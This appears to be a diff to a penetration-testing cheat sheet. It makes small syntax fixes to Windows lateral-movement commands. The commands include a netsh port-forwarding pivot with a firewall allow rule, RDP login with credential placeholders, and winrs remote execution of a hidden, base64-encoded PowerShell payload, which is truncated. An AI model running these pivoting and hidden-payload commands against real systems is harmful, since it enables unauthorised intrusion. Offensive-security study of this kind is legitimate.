@@ -1172,7 +1172,7 @@ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 
 ```c
 netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
-netstat -anp TCP | find "2222"
+netstat -anp TCP | findstr "2222"
 netsh interface portproxy show all
 netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
 ```
@@ -4164,8 +4164,8 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 ###### Execution
 
 ```c
-C:\> winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
-C:\> winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
+winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
+winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
 ```
 
 ###### PowerShell
